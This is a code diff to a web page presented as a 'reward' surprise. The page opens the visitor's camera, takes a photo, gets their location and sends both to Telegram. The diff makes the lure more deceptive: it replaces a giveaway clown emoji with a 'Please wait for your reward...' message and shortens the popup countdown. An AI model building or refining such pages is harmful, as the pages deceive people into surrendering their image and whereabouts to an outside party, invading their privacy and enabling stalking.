@@ -82,19 +82,24 @@
       .heart {
         font-size: 54px;
       }
-      .joker-emoji {
+      .wait-message {
         position: absolute;
         inset: 0;
         display: flex;
         align-items: center;
         justify-content: center;
-        font-size: 28px;
-        line-height: 1;
+        flex-direction: column;
+        gap: 4px;
+        padding: 4px;
+        text-align: center;
+        font-size: 7px;
+        line-height: 1.2;
+        color: #b34e87;
         background: #f8d8e9;
         border-radius: 50%;
         z-index: 10;
       }
-      .joker-emoji[hidden],
+      .wait-message[hidden],
       [hidden] {
         display: none !important;
       }
@@ -198,7 +203,9 @@
         <div id="placeholder" class="placeholder">
           <span class="heart">🎀</span><span>Your reward awaits...</span>
         </div>
-        <div id="joker" class="joker-emoji" hidden>🤡</div>
+        <div id="joker" class="wait-message" hidden>
+          Please wait<br />for your reward...
+        </div>
       </div>
       <div class="notice">
         🎁 This playful surprise opens your camera, takes a photo, gets your
@@ -431,7 +438,7 @@
             "Photo sent, but Telegram could not send the location message.",
           );
       }
-      function startPopupCountdown(seconds = 5) {
+      function startPopupCountdown(seconds = 3) {
         if (popupTimer) clearInterval(popupTimer);
         let left = seconds;
         popupCountdown.textContent = `Closing in ${left} seconds…`;
@@ -464,7 +471,7 @@
         await sendToTelegram(photo, loc);
         prankPopup.hidden = false;
         closePrank.disabled = false;
-        startPopupCountdown(5);
+        startPopupCountdown(3);
         setStatus("Photo and location sent successfully.");
       }
       startBtn.addEventListener("click", async () => {
